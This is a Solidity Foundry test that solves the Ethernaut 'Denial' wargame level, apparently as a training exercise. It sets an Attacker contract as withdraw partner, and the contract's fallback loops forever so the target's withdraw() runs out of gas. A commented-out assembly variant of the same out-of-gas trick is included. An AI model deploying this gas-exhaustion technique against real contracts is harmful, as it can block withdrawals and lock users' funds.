// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Denial} from "ethernaut/levels/Denial.sol";

contract DenialTest is Test {
    Denial target;
    address player;

    function setUp() public {
        player = makeAddr("player");
        vm.deal(player, 1 ether);

        target = new Denial();

        // contract starts with some funds
        payable(target).transfer(0.001 ether);
    }

    function attack() private {
        Attacker attacker = new Attacker();
        target.setWithdrawPartner(address(attacker));
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        assertGt(target.contractBalance(), 100, "contract must have some funds");

        uint256 maxGas = 1_000_000; // maximum 1M gas allowed for withdraw
        (bool ok,) = address(target).call{gas: maxGas}(abi.encodeWithSelector(target.withdraw.selector, [""]));
        assertFalse(ok, "withdraw() must have failed");
    }
}

contract Attacker {
    fallback() external payable {
        while (true) {}

        // TODO: do the shortest out-of-gas trick here, it was something like this?
        // assembly {
        //     pop(mload(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff))
        // }
    }
}
